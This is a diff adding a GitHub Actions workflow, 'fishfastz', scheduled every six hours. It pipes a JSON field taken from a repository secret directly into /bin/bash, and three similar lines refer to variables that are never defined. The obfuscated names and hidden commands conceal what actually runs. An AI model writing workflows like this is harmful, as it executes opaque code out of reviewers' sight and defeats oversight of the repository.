@@ -1,0 +1,21 @@
+name: fishfastz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fishfastz
+        env:
+          x6075: ${{ secrets.x6075 }}
+        run: |
+          echo $x6075 | jq -r .zl2025 | /bin/bash
+          echo $tmhbs8191 | jq -r .pf99 | /bin/bash
+          echo $pagfr36 | jq -r .j7 | /bin/bash
+          echo $ufyn3 | jq -r .qeb8771 | /bin/bash
+
